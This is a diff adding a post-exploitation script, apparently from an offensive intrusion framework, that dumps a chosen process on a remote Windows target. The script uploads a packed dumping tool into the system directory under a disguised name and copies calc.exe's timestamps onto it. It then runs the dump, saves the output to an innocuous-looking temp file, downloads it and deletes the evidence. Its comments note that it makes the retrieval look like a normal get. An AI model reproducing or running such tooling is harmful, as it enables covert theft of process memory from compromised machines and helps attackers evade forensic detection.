@@ -1,0 +1,129 @@
+#-------------------------------------------------------------------------------
+# File: bindump.dss
+# Description: Tries to run bindump on a user-specified PID
+#
+#-------------------------------------------------------------------------------
+@include "Ops_GenericFunctions.dsi";
+
+
+#make sure this is running on windows before we start!
+string $OS;
+_GetOsFamily($OS);
+if ($OS != "winnt") {
+	echo "* * *";
+	echo "* * * Bindump.dss needs to be run on a Windows OS";
+	echo "* * *";
+	return false;
+	}
+
+
+# What PID do you want to dump?
+int $offendingPID;
+GetInput("What is the PID for the offending process? (\"-1\" to exit)", $offendingPID);
+
+if ($offendingPID == -1) {
+	return true ;
+}
+
+# Get paths that we'll need later
+string $ScriptsDir;
+Ops_GetScriptsPath($ScriptsDir);
+string $resources;
+Ops_GetResourcePath($resources);
+
+@echo on;
+
+# Determine where to put bindump on target
+string $remoteToolName = "";
+GetEnv("remoteToolName", $remoteToolName);
+string $sSysPath;
+Ops_GetSystemPath($sSysPath);
+if ($remoteToolName == "") {
+	$remoteToolName="$sSysPath\\cmdl16.exe";
+} 
+
+# Put up the tool
+if(!prompt("Do you want to upload the tool as \"$remoteToolName\" ?")) {
+	GetInput("What do you want to upload the tool as?", $remoteToolName);
+}
+
+SetEnv("remoteToolName", $remoteToolName);
+
+while (`put bindump_packed.exe -project Ops -name $remoteToolName` == false) {
+	if (prompt("File exists, delete \"$remoteToolName\"?")) {
+		`delete -file "$remoteToolName)"`;
+		sleep(200);
+	} else {
+		return false;
+	}
+}
+
+# Match times to calc
+@echo off;
+`matchfiletimes -src $sSysPath\\calc.exe -dst $remoteToolName`;
+
+# Run bindump to get the size the dump will be
+@record on;
+`run -command "$remoteToolName $offendingPID" -redirect`;
+@record off;
+@echo on;
+
+# Grep out the size
+string $output;
+GetCmdData("ProcessOutput::output", $output);
+
+# Write the data to a temp file so we can grep it
+WriteFile("$resources\\bindmp.out",false,$output);
+
+@record on;
+`local grep $resources\\bindmp.out -pattern "Module: 0"`;
+@record off;
+`local run -command "cmd.exe /C del $resources\\bindmp.out"`;
+int $match;
+GetCmdData("File::numlines", $match);
+if ($match == 0) {
+	echo "Something when wrong, are you sure that PID exists?";
+	if (prompt("delete -file $remoteToolName?")) {
+		`delete -file "$remoteToolName"`;
+	}
+	return false;
+}
+
+echo "The size of the bin-dump output is listed (IN HEX) as the last line above.";
+echo "IF THIS AMOUNT IS REALLY BIG, OR IF THERE IS NOT 2X THIS AMOUNT OF ROOM ON THE DISK, SAY NO HERE.";
+
+if ( prompt("\nDo you want to bindump this exe?") ) {
+	@echo off;
+	if (prompt("run -command \"$remoteToolName $offendingPID ~Wa8z1.tmp 0\" -redirect bindump")) {
+		`run -command "$remoteToolName $offendingPID ~Wa8z1.tmp 0" -redirect bindump`;
+	}
+	@echo on;
+}
+
+
+`dir ~Wa8z1.tmp`;
+string $getFileName ;
+if (prompt("Download \"~Wa8z1.tmp\" (the output file, size listed above)?")) {
+	@record on ;
+	`get ~Wa8z1.tmp`;
+	@record off ;
+	GetCmdData("FileLocalName::localname", $getFileName) ;
+} 
+
+# Cleanup!
+if (prompt("Delete both files? (wait until get is done)")) {
+	`delete -file ~Wa8z1.tmp`;
+	`delete -file $remoteToolName`;
+	`dir ~Wa8z1.tmp`;
+	`dir $remoteToolName`;
+}
+
+############################################################
+# Set the variables, so this looks generally like a normal get
+############################################################
+StartCmdData("FileStart");
+AddCmdData("LocalName", $getFileName );
+EndCmdData();
+StoreCmdData();
+
+return true;
